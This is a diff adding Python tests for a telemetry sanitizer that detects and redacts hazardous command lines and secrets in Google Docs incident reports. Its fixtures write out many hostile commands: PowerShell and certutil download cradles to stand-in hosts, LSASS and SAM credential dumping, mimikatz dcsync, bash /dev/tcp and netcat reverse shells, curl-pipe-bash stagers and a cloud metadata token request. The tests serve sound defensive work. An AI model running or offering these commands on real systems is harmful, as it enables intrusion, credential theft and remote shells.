@@ -403,6 +403,7 @@ def test_adk_function_tool_declarations_for_docs_review_tools():
         "verify_and_redline_udm_queries_in_doc",
         "verify_and_redline_yaral2_rules_in_doc",
         "verify_and_redline_mitre_and_cve_in_doc",
+        "sanitize_and_redline_telemetry_in_doc",
         "inspect_doc_suggestions",
         "export_accepted_doc_to_markdown",
     ):
@@ -2252,5 +2253,407 @@ def test_review_google_doc_with_stage_a_includes_and_deduplicates_mitre_cve_span
     assert res["edits"]["applied_count"] == 2
 
 
+# ---------------------------------------------------------------------------
+# Cycle 5 (H6): Adversarial Telemetry Sanitizer Fuzzing, Forensic Preservation
+# & Stage A Sensitive Payload/Secret Span Red-Liner in Google Docs
+# ---------------------------------------------------------------------------
 
 
+def test_sanitize_telemetry_text_adversarial_corpus_25_patterns():
+    """Verifies that ``sanitize_telemetry_text`` redacts 25+ offensive command-line
+    obfuscation, LOLBin cradle, credential-dumping, Linux reverse-shell, and
+    cloud/API credential patterns into deterministic ``<REDACTED_...:sha256=...>``
+    tokens while preserving command verbs and maintaining idempotency."""
+    from manager.tools.docs_review_tools import sanitize_telemetry_text
+
+    standalone_b64 = (
+        "SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vMTk4LjUxLjEwMC40Mi9zdGFnZTIucHMxJyk="
+    )
+    corpus: list[tuple[str, str, str, str]] = [
+        (
+            "powershell_enc_short",
+            "powershell.exe -NoP -W Hidden -enc aGVsbG8gd29ybGQgdGVzdCBwYXlsb2Fk",
+            "aGVsbG8gd29ybGQgdGVzdCBwYXlsb2Fk",
+            "<REDACTED_B64:len=32,sha256=",
+        ),
+        (
+            "powershell_encodedcommand_long",
+            "pwsh -NoProfile -NonInteractive -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACcASABlAGwAbABvACcA",
+            "VwByAGkAdABlAC0ASABvAHMAdAAgACcASABlAGwAbABvACcA",
+            "<REDACTED_B64:len=48,sha256=",
+        ),
+        (
+            "powershell_e_short_flag",
+            "powershell.exe -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA==",
+            "JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA==",
+            "<REDACTED_B64:len=56,sha256=",
+        ),
+        (
+            "dotnet_frombase64string_single_quote",
+            "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aGVsbG8gd29ybGQgdGVzdCBwYXlsb2Fk'))",
+            "aGVsbG8gd29ybGQgdGVzdCBwYXlsb2Fk",
+            "FromBase64String('<REDACTED_B64:len=32,sha256=",
+        ),
+        (
+            "dotnet_frombase64string_double_quote",
+            '[Convert]::FromBase64String("VwByAGkAdABlAC0ASABvAHMAdAAgACcASABlAGwAbABvACcA")',
+            "VwByAGkAdABlAC0ASABvAHMAdAAgACcASABlAGwAbABvACcA",
+            'FromBase64String("<REDACTED_B64:len=48,sha256=',
+        ),
+        (
+            "standalone_base64_stager_blob",
+            f"Decoded stager payload blob: {standalone_b64}",
+            standalone_b64,
+            f"<REDACTED_B64:len={len(standalone_b64)},sha256=",
+        ),
+        (
+            "net_webclient_downloadstring",
+            "powershell -c IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.42/stage2.ps1')",
+            "http://198.51.100.42/stage2.ps1",
+            "DownloadString(<REDACTED_CRADLE:sha256=",
+        ),
+        (
+            "net_webclient_downloadfile",
+            "(New-Object System.Net.WebClient).DownloadFile('http://198.51.100.42/beacon.exe','C:\\Users\\Public\\beacon.exe')",
+            "http://198.51.100.42/beacon.exe",
+            "DownloadFile(<REDACTED_CRADLE:sha256=",
+        ),
+        (
+            "iwr_pipe_iex",
+            "iwr -UseBasicParsing http://198.51.100.42/loader.ps1 | iex",
+            "http://198.51.100.42/loader.ps1 | iex",
+            "iwr <REDACTED_CRADLE:sha256=",
+        ),
+        (
+            "invoke_restmethod_pipe_invoke_expression",
+            "Invoke-RestMethod https://evil-c2.example/implant.ps1 | Invoke-Expression",
+            "https://evil-c2.example/implant.ps1 | Invoke-Expression",
+            "Invoke-RestMethod <REDACTED_CRADLE:sha256=",
+        ),
+        (
+            "certutil_urlcache_split_f",
+            "certutil.exe -urlcache -split -f http://198.51.100.42/payload.exe C:\\Windows\\Temp\\payload.exe",
+            "http://198.51.100.42/payload.exe C:\\Windows\\Temp\\payload.exe",
+            "certutil.exe -urlcache -split -f <REDACTED_LOLBIN_ARGS:sha256=",
+        ),
+        (
+            "bitsadmin_transfer",
+            "bitsadmin /transfer BackdoorJob /download /priority high http://198.51.100.42/stage.dll C:\\Temp\\stage.dll",
+            "BackdoorJob /download /priority high http://198.51.100.42/stage.dll C:\\Temp\\stage.dll",
+            "bitsadmin /transfer <REDACTED_LOLBIN_ARGS:sha256=",
+        ),
+        (
+            "mshta_vbscript_execute",
+            'mshta.exe vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -ep bypass"",0:close")',
+            'Execute("CreateObject(""Wscript.Shell"").Run ""powershell -ep bypass"",0:close")',
+            "mshta.exe vbscript:<REDACTED_LOLBIN_ARGS:sha256=",
+        ),
+        (
+            "regsvr32_scrobj_squiblydoo",
+            "regsvr32.exe /s /n /u /i:http://198.51.100.42/file.sct scrobj.dll",
+            "http://198.51.100.42/file.sct scrobj.dll",
+            "regsvr32.exe /s /n /u /i:<REDACTED_LOLBIN_ARGS:sha256=",
+        ),
+        (
+            "comsvcs_minidump_lsass",
+            "- Hazard 3 (Comsvcs MiniDump Arguments): rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\Windows\\Temp\\lsass.dmp full",
+            "624 C:\\Windows\\Temp\\lsass.dmp full",
+            "(Comsvcs MiniDump Arguments): rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump <REDACTED_DUMP_ARGS:sha256=",
+        ),
+        (
+            "procdump_ma_lsass",
+            "procdump64.exe -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass_dump.dmp",
+            "lsass.exe C:\\Windows\\Temp\\lsass_dump.dmp",
+            "procdump64.exe -accepteula -ma <REDACTED_DUMP_ARGS:sha256=",
+        ),
+        (
+            "ntdsutil_ifm_create_full",
+            'ntdsutil.exe "ac i ntds" "ifm" "create full C:\\Temp\\ntds_extract" q q',
+            '"ac i ntds" "ifm" "create full C:\\Temp\\ntds_extract" q q',
+            "ntdsutil.exe <REDACTED_DUMP_ARGS:sha256=",
+        ),
+        (
+            "reg_save_hklm_sam",
+            "reg.exe save HKLM\\SAM C:\\Windows\\Temp\\sam.hiv /y",
+            "C:\\Windows\\Temp\\sam.hiv /y",
+            "reg.exe save HKLM\\SAM <REDACTED_DUMP_ARGS:sha256=",
+        ),
+        (
+            "reg_save_hklm_system",
+            "reg save HKLM\\SYSTEM C:\\Windows\\Temp\\system.hiv /y",
+            "C:\\Windows\\Temp\\system.hiv /y",
+            "reg save HKLM\\SYSTEM <REDACTED_DUMP_ARGS:sha256=",
+        ),
+        (
+            "mimikatz_sekurlsa_logonpasswords",
+            'mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"',
+            "logonpasswords",
+            "sekurlsa::<REDACTED_DUMP_ARGS:sha256=",
+        ),
+        (
+            "mimikatz_lsadump_dcsync",
+            'mimikatz.exe "lsadump::dcsync /domain:corp.local /user:krbtgt"',
+            "/domain:corp.local /user:krbtgt",
+            "lsadump::dcsync <REDACTED_DUMP_ARGS:sha256=",
+        ),
+        (
+            "linux_dev_tcp_reverse_shell",
+            "bash -c 'bash -i >& /dev/tcp/198.51.100.42/4444 0>&1'",
+            "/dev/tcp/198.51.100.42/4444 0>&1",
+            "<REDACTED_REVERSE_SHELL:sha256=",
+        ),
+        (
+            "netcat_dash_e_reverse_shell",
+            "nc -nv 198.51.100.42 4444 -e /bin/bash",
+            "-nv 198.51.100.42 4444 -e /bin/bash",
+            "nc <REDACTED_REVERSE_SHELL:sha256=",
+        ),
+        (
+            "curl_pipe_bash_stager",
+            "curl -fsSL http://198.51.100.42/install_miner.sh | sudo bash",
+            "-fsSL http://198.51.100.42/install_miner.sh | sudo bash",
+            "curl <REDACTED_REVERSE_SHELL:sha256=",
+        ),
+        (
+            "wget_pipe_sh_stager",
+            "wget -qO- http://198.51.100.42/bot.sh | sh",
+            "-qO- http://198.51.100.42/bot.sh | sh",
+            "wget <REDACTED_REVERSE_SHELL:sha256=",
+        ),
+        (
+            "gcp_oauth2_ya29_access_token",
+            "Authorization: Bearer ya29" + ".a0AXooCgv9FakeAccessTokenForTesting1234567890abcdef",
+            "ya29" + ".a0AXooCgv9FakeAccessTokenForTesting1234567890abcdef",
+            "<REDACTED_GCP_TOKEN:sha256=",
+        ),
+        (
+            "jwt_bearer_token_three_part",
+            "Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
+            "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
+            "<REDACTED_JWT:sha256=",
+        ),
+        (
+            "aws_access_key_id_akia",
+            "export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE",
+            "AKIAIOSFODNN7EXAMPLE",
+            "<REDACTED_AWS_KEY:sha256=",
+        ),
+        (
+            "pem_private_key_block",
+            "-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA0123456789abcdef\n-----END RSA PRIVATE KEY-----",
+            "MIIEpAIBAAKCAQEA0123456789abcdef",
+            "<REDACTED_PRIVATE_KEY:sha256=",
+        ),
+    ]
+
+    assert len(corpus) >= 25
+    for label, raw_input, forbidden_substring, expected_marker in corpus:
+        sanitized = sanitize_telemetry_text(raw_input)
+        assert forbidden_substring not in sanitized, f"[{label}] raw payload survived: {sanitized}"
+        assert expected_marker in sanitized, f"[{label}] expected token {expected_marker!r} missing in {sanitized!r}"
+        # Verify strict idempotency: running sanitize_telemetry_text a second time is a no-op
+        assert sanitize_telemetry_text(sanitized) == sanitized, f"[{label}] non-idempotent sanitization"
+
+
+def test_sanitize_telemetry_text_preserves_forensic_identifiers_100_percent():
+    """Verifies that ``sanitize_telemetry_text`` preserves 100% of benign forensic
+    identifiers (MD5, SHA-1, SHA-256, UUIDs, Windows SIDs, GCP resource paths,
+    service accounts, Chronicle UDM fields, and MITRE/CVE IDs) without false-positive
+    redactions."""
+    from manager.tools.docs_review_tools import sanitize_telemetry_text
+
+    forensic_lines = [
+        "MD5: d41d8cd98f00b204e9800998ecf8427e",
+        "SHA-1: da39a3ee5e6b4b0d3255bfef95601890afd80709",
+        "SHA-256 (Case 33280 PsExec): e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+        "SHA-256 (Case 33285 Upper): 7F83B1657FF1FC53B92DC18148A1D65DFC2D4B1FA3D677284ADDD200126D9069",
+        "Alert UUID: a13f6726-efed-452e-9008-8fe0d3cb0f75",
+        "Windows SID: S-1-5-21-3623811015-3361044348-30300820-1013",
+        "GCP Compute Resource: projects/base-production/zones/us-central1-a/instances/production-do-not-delete1",
+        "GCP IAM Principal: serviceAccount:hello@base-production.iam.gserviceaccount.com",
+        'Chronicle UDM Query: metadata.event_type = "PROCESS_LAUNCH" AND target.process.file.sha256 = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"',
+        "MITRE ATT&CK & CISA KEV: T1059.001, T1003.001, T1078.004, T1098.003, CVE-2024-21762, CVE-2024-1709",
+        "Narrative prose: Attacker dumped LSASS via rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump and attributed it to T1003.001.",
+    ]
+    full_block = "\n".join(forensic_lines)
+    sanitized = sanitize_telemetry_text(full_block)
+    assert sanitized == full_block
+    assert "<REDACTED_" not in sanitized
+
+
+def test_find_telemetry_hazard_spans_and_sanitize_and_redline_telemetry_in_doc_idempotency():
+    """Verifies exact 1-based UTF-16 ``start_index`` and ``end_index`` calculation
+    in ``find_telemetry_hazard_spans``, descending-index ``writeMode="SUGGEST"``
+    batchUpdate requests in ``sanitize_and_redline_telemetry_in_doc``, parity with
+    ``sanitize_telemetry_text``, and multi-pass suggestion idempotency."""
+    from manager.tools.docs_review_tools import (
+        find_telemetry_hazard_spans,
+        sanitize_and_redline_telemetry_in_doc,
+        sanitize_telemetry_text,
+    )
+
+    doc_text = (
+        "Incident Telemetry Extract:\n"
+        "1. Encoded Stager: powershell.exe -NoP -W Hidden -Enc aGVsbG8gd29ybGQgdGVzdCBwYXlsb2Fk\n"
+        "2. Credential Dump: rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\Windows\\Temp\\lsass.dmp full\n"
+        "3. LOLBin Cradle: certutil.exe -urlcache -split -f http://198.51.100.42/beacon.exe C:\\Temp\\beacon.exe\n"
+        "4. Reverse Shell: bash -i >& /dev/tcp/198.51.100.42/4444 0>&1\n"
+        "5. Leaked GCP Token: Authorization: Bearer ya29" + ".a0AXooCgv9FakeAccessTokenForTesting1234567890abcdef\n"
+        "6. Forensic Control SHA-256: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855\n"
+    )
+    mock_doc = _make_single_paragraph_doc(
+        "doc-telemetry-redline", "Telemetry Redline Test", doc_text
+    )
+    plain, idx_map = _extract_text_and_index_map(mock_doc)
+    comments, edits, findings = find_telemetry_hazard_spans(plain, idx_map)
+    assert len(findings) == 5
+    assert len(comments) == 5
+    assert len(edits) == 5
+
+    # Applying the span replacements back-to-front on plain_text must equal sanitize_telemetry_text(plain_text)
+    reconstructed = plain
+    for edit in sorted(edits, key=lambda item: item["start_index"], reverse=True):
+        c_start = edit["start_index"] - 1
+        c_end = edit["end_index"] - 1
+        reconstructed = (
+            reconstructed[:c_start] + edit["replacement"] + reconstructed[c_end:]
+        )
+    assert reconstructed == sanitize_telemetry_text(plain)
+
+    batch_calls: list[dict[str, Any]] = []
+
+    def handler(request: httpx.Request) -> httpx.Response:
+        if request.method == "GET":
+            return httpx.Response(200, json=mock_doc)
+        payload = json.loads(request.content.decode("utf-8"))
+        batch_calls.append(payload)
+        if any("insertComment" in r for r in payload.get("requests", [])):
+            return httpx.Response(
+                200,
+                json={
+                    "replies": [
+                        {"insertComment": {"commentId": f"c-th-{i}"}}
+                        for i in range(len(payload.get("requests", [])))
+                    ]
+                },
+            )
+        return httpx.Response(
+            200,
+            json={"replies": [{} for _ in payload.get("requests", [])]},
+        )
+
+    res = sanitize_and_redline_telemetry_in_doc(
+        "doc-telemetry-redline",
+        token_source=StaticTokenSource("adc-token"),
+        transport=httpx.MockTransport(handler),
+    )
+    assert res["status"] == "success"
+    assert res["telemetry_hazard_findings_count"] == 5
+    assert res["skipped_existing_suggestion_count"] == 0
+    assert res["comments"]["inserted_count"] == 5
+    assert res["edits"]["applied_count"] == 5
+    assert len(batch_calls) == 2
+    assert "writeControl" not in batch_calls[0]
+    assert batch_calls[1]["writeControl"] == {"writeMode": "SUGGEST"}
+
+    delete_starts = [
+        req["deleteContentRange"]["range"]["startIndex"]
+        for req in batch_calls[1]["requests"]
+        if "deleteContentRange" in req
+    ]
+    assert delete_starts == sorted(delete_starts, reverse=True)
+
+    # Second pass with pending suggestions covering the document -> 0 new edits, 5 skipped
+    mock_doc_pending = {
+        "documentId": "doc-telemetry-redline",
+        "title": "Telemetry Redline Test",
+        "body": {
+            "content": [
+                {
+                    "paragraph": {
+                        "elements": [
+                            {
+                                "startIndex": 1,
+                                "endIndex": len(doc_text) + 1,
+                                "textRun": {
+                                    "content": doc_text,
+                                    "suggestedDeletionIds": ["suggest.telemetry.existing"],
+                                },
+                            }
+                        ]
+                    }
+                }
+            ]
+        },
+    }
+    batch_calls.clear()
+    res2 = sanitize_and_redline_telemetry_in_doc(
+        "doc-telemetry-redline",
+        token_source=StaticTokenSource("adc-token"),
+        transport=httpx.MockTransport(lambda req: httpx.Response(200, json=mock_doc_pending)),
+    )
+    assert res2["status"] == "success"
+    assert res2["telemetry_hazard_findings_count"] == 0
+    assert res2["skipped_existing_suggestion_count"] == 5
+    assert res2["comments"]["inserted_count"] == 0
+    assert res2["edits"]["applied_count"] == 0
+    assert len(batch_calls) == 0
+
+
+def test_review_google_doc_with_stage_a_includes_telemetry_hazard_spans_and_adk_declaration():
+    """Verifies that ``review_google_doc_with_stage_a`` automatically runs
+    ``find_telemetry_hazard_spans`` (``stage_a_telemetry_hazard_count``),
+    recognizes Cloud IMDS SSRF URLs via ``find_deterministic_indicator_spans``,
+    and deduplicates overlapping spans cleanly."""
+    from google.adk.tools.function_tool import FunctionTool
+    from manager.tools import tools as tools_module
+    from manager.tools.docs_review_tools import (
+        find_deterministic_indicator_spans,
+        review_google_doc_with_stage_a,
+    )
+
+    doc_text = (
+        "Cloud & Endpoint Postmortem:\n"
+        "- IMDS SSRF Request: http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token\n"
+        "- Stolen GCP Bearer Token: ya29" + ".a0AXooCgv9FakeAccessTokenForTesting1234567890abcdef\n"
+        "- Encoded PowerShell: powershell.exe -enc aGVsbG8gd29ybGQgdGVzdCBwYXlsb2Fk\n"
+    )
+    mock_doc = _make_single_paragraph_doc(
+        "doc-stage-a-telemetry", "Stage A Telemetry & IMDS", doc_text
+    )
+    plain, idx_map = _extract_text_and_index_map(mock_doc)
+    url_comments, url_edits = find_deterministic_indicator_spans(plain, idx_map)
+    assert len(url_edits) == 1
+    assert url_edits[0]["replacement"].startswith("hxxp://169[.]254[.]169[.]254/")
+    assert "Cloud IMDS SSRF Hazard" in url_comments[0]["comment"]
+
+    def handler(request: httpx.Request) -> httpx.Response:
+        if request.method == "GET":
+            return httpx.Response(200, json=mock_doc)
+        payload = json.loads(request.content.decode("utf-8"))
+        return httpx.Response(
+            200,
+            json={
+                "documentId": "doc-stage-a-telemetry",
+                "replies": [{} for _ in payload.get("requests", [])],
+            },
+        )
+
+    res = review_google_doc_with_stage_a(
+        "doc-stage-a-telemetry",
+        token_source=StaticTokenSource("adc-token"),
+        transport=httpx.MockTransport(handler),
+    )
+    assert res["status"] == "success"
+    assert res["stage_a_telemetry_hazard_count"] == 2
+    assert res["stage_a_url_count"] == 1
+    assert res["comments"]["inserted_count"] == 3
+    assert res["edits"]["applied_count"] == 3
+
+    # Verify ADK FunctionTool declaration for sanitize_and_redline_telemetry_in_doc
+    ft = FunctionTool(tools_module.sanitize_and_redline_telemetry_in_doc)
+    decl = ft._get_declaration()
+    assert decl.name == "sanitize_and_redline_telemetry_in_doc"
+    props = (decl.parameters_json_schema or {}).get("properties", {})
+    assert "document_id" in props
+    assert "tool_context" not in props
